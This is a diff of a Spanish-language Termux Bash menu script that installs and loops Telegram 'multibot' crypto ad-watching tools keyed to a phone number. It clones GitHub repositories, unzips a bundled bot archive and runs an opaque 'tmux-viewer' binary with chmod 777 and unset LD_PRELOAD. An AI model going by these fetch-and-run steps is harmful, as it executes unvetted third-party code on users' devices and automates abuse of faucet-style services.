@@ -370,223 +370,133 @@ said_610)
 
     printf "$az"
     read -p "Numero :   " num
+    echo
+    echo
+    printf "$e cuantos minutos espero entre cada intento ?"
+    echo
+    printf "$vede"
+    read -p "Tiempo (en minutos)   >> " timepi
+    timepienseg=$(( $timepi*60 ))
     printf "$re"
     function inc {
         cd
         cd Mb
-        python zec.py $num
+        python btc.py $num
         cd
         clear
-        printf "$ve 5 horas restantes$re"
-        sleep 3600
-        clear
-        printf "$ve 4 horas restantes$re"
-        sleep 3600
-        clear
-        printf "$ve 3 horas restantes$re"
-        sleep 1800
-        clear
-        printf "$ve 2 horas y 30 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 2 horas y 20 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 2 horas y 10 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 2 horas restantes$re"
-        sleep 600
-        clear
-        printf "$ve 1 hora y 50 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 1 hora y 40 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 1 hora y 30 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 1 hora y 20 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 1 hora y 10 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 1 hora restante$re"
-        sleep 600
-        clear
-        printf "$ve 50 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 40 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 30 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 20 minutos restantes$re"
-        sleep 600
-        clear
-        printf "$ve 10 minutos restantes$re"
-        sleep 300
-        clear
-        printf "$ve 5 minutos restantes$re"
-        sleep 60
-        clear
-        printf "$ve 4 minutos restantes$re"
-        sleep 60
-        clear
-        printf "$ve 3 minutos restantes$re"
-        sleep 60
-        clear
-        printf "$ve 2 minutos restantes$re"
-        sleep 60
-        clear
-        printf "$ve 1 minuto restante$re"
-        echo
-        printf "$ro $bgb ALISTANDO PARA VER MAS ADS $re"
-        sleep 60
+    printf "
+$ce Esperando $timepi minutos para reintentar"
+    sleep $timepienseg
         inc
     }
     inc
     ;;
-said_26)
-    cd ../usr/etc
-    mv bash.bashrc bash.bashra
-    mv motd modt
-    ;;
-said_708)
+said_600)
+    cd
+    pkg update -y
+    pkg upgrade -y
+    pkg install python
+    pip install --upgrade pip
+    termux-setup-storage
+    cd
+    git clone https://github.com/SaidGR/Mb.git
+    cd Mb
+    unzip 'MULTIBOT (SFILE.MOBI).zip'
+    rm -Rf 'MULTIBOT (SFILE.MOBI).zip'
+    cd session
+    rm -Rf +6281360080100.session
+    rm -Rf +6285217779420.session
+    rm -Rf +6285348006188.session
+    rm -Rf +6285358669922.session
+    cd
+    cd Mb
+    pip install -r requirements.txt
+    cd
     clear
     printf "
-    $am Guarda la actualizacion en la Carpeta de Descargas de tu celular, $gr en algunos moviles esta caroeta se llama Download, $am para estar seguro coloca el nombre de la carpeta de descargas aca abajo"
-    echo
-    read -p ">>  " down
-    echo
-    echo
-    printf "
-    $am Coloca el nombre del script actualizado aca, $gr Ten en cuanta que algunos dispositivos cambia su nombre a (nombre).enc $am por lo cual para estar seguros colocaremos el nombre completo como esta guardado en download"
-    echo
-    read -p ">>  " nomb
-    echo
-    echo
-    printf "
-    $ro ..............$ve ACTUALIZANDO $ro..............$re
-    "
-    sleep 5
-    cd
-    cd /sdcard/$down
-    mv $nomb $HOME
-    cd
-    mv $nomb said235
-    chmod +x said235
-    clear
-    cd
-    printf "
-    $ro borrando script desactualizado...$am si te a saltado algun error niega este proceso colocando la letra $ce n$am  De lo contrario, si todo te ha dado correcto coloca la letra $ce y$re"
-    echo
-    read -p "[y/n] > " opcyn
-    case opcyn in
-        y)
-            rm -Rf ../usr/bin/said
-            cd
-            mv said235 ../usr/bin
-            cd
-            cd ../usr/bin
-            mv said235 said
-            cd
-            pkg install sl
-            sl
-            printf "$ve LISTO!$ce actualizado$re"
-            cd
-            ;;
-        n)
-            cd
-            mv said235 $nomb
-            mv $nomb /sdcard/$down
-            clear
-            cd
-            printf "$ro $bgb ...CANCELADO... $re"
-            cd
-            ;;
-    esac
+$ro $bgb LISTO, EJECUTA AHORA said_610 PARA EMPEZAR A MINAR AHORA $re "
+    said
     ;;
+
 said_117)
-    printf "
-    $ro $bgc[a]$re $ve Instalacion$re
-    $ro $bgc[b]$re $ve Utilizar...$re
-    "
-    read -p "[a/b]  > " elab
-    case $elab in
+    printf "                                      
+$ro $bgc[a]$re $ve Instalacion$re
+$ro $bgc[b]$re $ve Utilizar...$re"
+    echo
+    echo
+    read -p "[a/b]  > " opcinu
+    case $opcinu in
         a)
-            clear
-            cd                                                              printf "                                                        $ce ¿Como de llama la carpeta de descargas en tu movil?$re"                                                                     echo
-            echo 
-            read -p ">>  " cade                                             cd /sdcard/$cade                                                mv tmux-viewer $HOME                                            cd                                                              mv tmux-viewer .tmux-viewer                                     chmod +x .tmux-viewer
             cd
+            cd SG
+            git clone https://github.com/SaidGR/bwnzq12
+            cd bwnzq12
+            mv tmux-viewer $HOME
+            cd
+            chmod 777 tmux-viewer
+            cd SG
+            rm -Rf bwnzq12
+            cd
+            printf "
+$ve Listo, ahora ejecuta le letra $am b $ve cada vez que quieras usar la herramienta$re"
+            echo
+            echo
             ;;
         b)
+            cd
             clear
             printf "
-$ro Recuerda; $vede A continuacion debes escribir una contrasela de 4 letras... y debes volverla a escribir si te piden confirmarla $re
+$am ¿Tu dispositivo es de 32 o 64 bits? $re
 
-Seguidamente, se te limpiara la pantall, y aparecera una linea amarilla abajo, ahi debes volver a escribir la frase
-
-$ce DESPUES DE UNOS 3 SEGUNDOS DE HABER PUESTO LA CONTRASELA EN ESA LINEA AMARILLA.... TE SALDRA UN CODIGO DE LARGO DE LETRAS MAYUSCULAS Y MINUSCULAS,  ESE CODIGO ES EL QUE DEBES DE COPIAR
-
-
-$ro NOTA;  ESE CODIGO SE QUITA RAPIDO, ASI QUE DEBES COPIARLO RAPIDAMENTE ANTES DE QUE SE QUITE$re"
-
-                        echo
+$ro $bgc[a]$re $ve 32 bits
+$ro $bgc[b]$re $ve 64 bits"
             echo
-            read -p "¿entendido?  [si/no];  " ensn
-            
-            case $ensn in
-                si)
-                    echo
+            echo
+            read -p "[a/b]  " opc3264
+            case $opc3264 in
+                a)
                     clear
                     printf "
-$ce ¿Cual es la arquitectura de tu celular?$re
+$ro Recuerda; $vede A continuacion debes escribir una contrasela de 4 letras... y debes volverla a escribir si te piden confirmarla $re                                                                                                                         Seguidamente, se te limpiara la pantall, y aparecera una linea amarilla abajo, ahi debes volver a escribir la frase             
+$ce DESPUES DE UNOS 3 SEGUNDOS DE HABER PUESTO LA CONTRASELA EN
+ESA LINEA AMARILLA.... TE SALDRA UN CODIGO LARGO DE LETRAS MAYUSCULAS Y MINUSCULAS,  ESE CODIGO ES EL QUE DEBES DE COPIAR                                                                       $ro NOTA;  ESE CODIGO SE QUITA RAPIDO, ASI QUE DEBES COPIARLO RAPIDAMENTE ANTES DE QUE SE QUITE$re
 
-$ro $bgc[1]$re $ve Es de 32 bits$re
-$ro $bgc[2]$re $ve Es de 64 bits$re
-$ro $bgc[3]$re $ve No lo se...$re
-"
-                                        echo
-                    read -p ">>  " pc123
-                    case pc123 in
-                        1)
-                            cd
-                            ./.tmux-viewer
-                            ;;
-                        2)
-                            cd
-                            unset LD_PRELOAD
-                            ./.tmux-viewer
-                            ;;
-                        3)
-                            clear
-                            printf "
-$amde Si te da error, ejecuta de nuevo y elige la opcion 2$re"
-                                                        sleep 6
-                            cd
-                            ./.tmux-viewer
-                            ;;
-                    esac
-                    ;;
-                no)
+$ce PRECIONA ENTER PARA CONTINUAR"
+                    read
                     cd
+                    ./tmux-viewer
                     ;;
+                b)
+                    clear
+                    printf "
+$ro Recuerda; $vede A continuacion debes escribir una contrasela de 4 letras... y debes volverla a escribir si te piden confirmarla $re
+
+seguidamente, se te limpiara la pantall, y aparecera una linea amarilla abajo, ahi debes volver a escribir la frase             
+
+$ce DESPUES DE UNOS 3 SEGUNDOS DE HABER PUESTO LA CONTRASELA EN ESA LINEA AMARILLA.... TE SALDRA UN CODIGO LARGO DE LETRAS MAYUSCULAS Y MINUSCULAS,  ESE CODIGO ES EL QUE DEBES DE COPIAR
+
+$ro NOTA;  ESE CODIGO SE QUITA RAPIDO, ASI QUE DEBES COPIARLO RAPIDAMENTE ANTES DE QUE SE QUITE$re
+
+$ce PRECIONA ENTER PARA CONTINUAR $re"
+                    
+                    read
+                    cd
+                    unset LD_PRELOAD
+                    ./tmux-viewer
+                    ;;
+
             esac
             ;;
     esac
     ;;
-mi_grupo) 
-    cd
-    termux-open https://chat.whatsapp.com/JH8RHcNM7R2Arz0NWJiloI
-    ;;
-base) 
-    cd
+mi_grupo)
+
+        cd
+        termux-open https://chat.whatsapp.com/JH8RHcNM7R2Arz0NWJiloI
+        ;;
+base)
+
+        cd
     ;;
 
 esac
